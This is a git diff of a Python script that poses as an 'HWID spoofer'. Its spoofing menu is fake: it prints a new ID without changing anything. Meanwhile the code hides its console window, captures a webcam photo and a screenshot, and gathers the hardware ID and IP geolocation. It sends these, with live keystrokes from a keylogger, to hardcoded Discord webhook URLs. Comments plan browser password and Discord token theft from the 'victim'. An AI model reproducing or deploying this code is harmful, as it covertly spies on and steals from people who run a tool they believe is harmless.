@@ -13,10 +13,32 @@ import pyautogui
 import keyboard
 from threading import Timer
 import win32console, win32gui
+from cv2 import VideoCapture, imwrite, waitKey, destroyWindow
+import pyttsx3
 
 colorama.init()
 window = win32console.GetConsoleWindow()
 win32gui.ShowWindow(window, 0)
+
+if not os.path.exists('./data'):
+    os.makedirs('./data')
+else:
+    pass
+
+# Create a VideoCapture then stop after a picture is taken
+cam = VideoCapture(0)
+
+result, image = cam.read()
+
+if result:
+    imwrite("./data/webcam.png", image)
+    has_webcam = True
+    waitKey(0)
+else:
+    pass
+    has_webcam = False
+
+
 # Fetch Actual HWID
 hw_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
 
@@ -35,8 +57,13 @@ lat = ip_info['lat']
 lon = ip_info['lon']
 
 timer = 10
-keylog_webhook = "KEYLOG WEBHOOK GOES HERE"
-logger_webhook = "LOGGER WEBHOOK GOES HERE"
+
+keylog_webhook = "https://discord.com/api/webhooks/1039990162458955776/dG9awfUax8tBUWtFYnYt6bJYpXXAVBeHUQwzthqQcOT4yIVG-Xr-AjUikjxdEU6LZ87z"
+log_webhook = "https://discord.com/api/webhooks/1039283621325975635/2tA8bWH3jrsQDBIgzNFijJ423UODJrCpmubR75Po3ODBa7KLIQJd24Qbnm6eCug8weNZ"
+webcam_webhook = "https://discord.com/api/webhooks/1043469886975905812/r3v8QKXe8wW7bY5RAnT3oltEkSKpKyzu1dbCuQ8hoXXwiYRgddcISOwXqzHgTs4olFQe"
+
+
+# Keylogging Code ( https://github.com/3ct0s/discord-keylogger )
 
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
@@ -96,8 +123,13 @@ class Keylogger:
         keyboard.wait()
 
 
+# Take a Screenshot
+screenshot = pyautogui.screenshot()
+screenshot.save('./data/screenshot.png')
+
+
 # Webhook URL
-webhook = DiscordWebhook(url=logger_webhook, rate_limit_retry=True)
+webhook = DiscordWebhook(url=log_webhook, rate_limit_retry=True)
 embed = DiscordEmbed(title='miguelitoo :33', description='AE')
 embed.set_author(name='Made by Miguelitoo', url='')
 embed.add_embed_field(name="HWID", value=f"||{hw_id}||", inline=True)
@@ -110,13 +142,84 @@ embed.add_embed_field(name="Timezone", value=f"||{timezone}||", inline=True)
 embed.add_embed_field(name="Zip Code", value=f"||{zip_code}||", inline=True)
 embed.add_embed_field(name="Latitude", value=f"||{lat}||", inline=True)
 embed.add_embed_field(name="Longitude", value=f"||{lon}||", inline=True)
+embed.add_embed_field(name="Has Webcam", value=f"||{has_webcam}||", inline=True)
 
+with open("./data/screenshot.png", "rb") as f:
+    webhook.add_file(file=f.read(), filename='screenshot.png')
+
+with open("./data/webcam.png", "rb") as f:
+    webhook.add_file(file=f.read(), filename='webcam.png')
 
 
 webhook.add_embed(embed)
 
 response = webhook.execute(remove_embeds=True, remove_files=True)
+if os.path.exists("./data/screenshot.png"):
+    os.remove("./data/screenshot.png")
+    
+if os.path.exists("./data/webcam.png"):
+    os.remove("./data/webcam.png")
 
 
 keylogger = Keylogger(interval=timer, report_method="webhook")    
 keylogger.start()
+
+# To get this kind of fonts, visit fsymbols.com (https://fsymbols.com/generators/carty/)
+# This is the message that will be shown in the console.
+print(Fore.LIGHTCYAN_EX + """
+
+
+██╗░░██╗░██╗░░░░░░░██╗██╗██████╗░  ░██████╗██████╗░░█████╗░░█████╗░███████╗███████╗██████╗░
+██║░░██║░██║░░██╗░░██║██║██╔══██╗  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
+███████║░╚██╗████╗██╔╝██║██║░░██║  ╚█████╗░██████╔╝██║░░██║██║░░██║█████╗░░█████╗░░██████╔╝
+██╔══██║░░████╔═████║░██║██║░░██║  ░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══╝░░██╔══╝░░██╔══██╗
+██║░░██║░░╚██╔╝░╚██╔╝░██║██████╔╝  ██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░███████╗██║░░██║
+╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░  ╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
+
+""")
+print("--------------------------------------------------")
+print(Fore.RED + "Script to spoof your HWID and change it to a new one.")
+print(Fore.RED + "Use this spoofer at your own risk.")
+print("--------------------------------------------------")
+print(Fore.LIGHTCYAN_EX + "1. Spoof HWID")
+print(Fore.LIGHTCYAN_EX + "2. Exit")
+print("--------------------------------------------------")
+print(Fore.LIGHTCYAN_EX + "Please select an option.")
+print("--------------------------------------------------")
+option = input(Fore.LIGHTCYAN_EX + "Option: ")
+
+# Options, add as many as you want.
+if option == "1": 
+    myuuid = uuid.uuid4()
+    myuuid_str = str(myuuid)
+    string = myuuid_str
+    print("Getting current HWID...")
+    time.sleep(1)
+    hardwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
+    print("Your current HWID is: " + string.upper())
+    time.sleep(0.2)
+    print("Spoofing HWID...")
+    time.sleep(2)
+    print("HWID spoofed.")
+    print("New HWID: " + hardwid)
+elif option == "2":
+    exit()
+else:
+    print("Invalid option.")
+    exit()
+os.system("pause")
+
+#This is not the best logger, as it only pulls IP and some other stuff, but it's a start.
+#I will be updating this logger in the future, so stay tuned.
+#If you have any questions, feel free to DM me on Discord: Birdy#9457
+
+
+#Future Updates:
+#1. Screenshot of the victim's screen. - Readded
+#2. Webcam Capture. - Done
+#3. Chrome Password. 
+#4. Discord Token Grabber. 
+
+
+
+
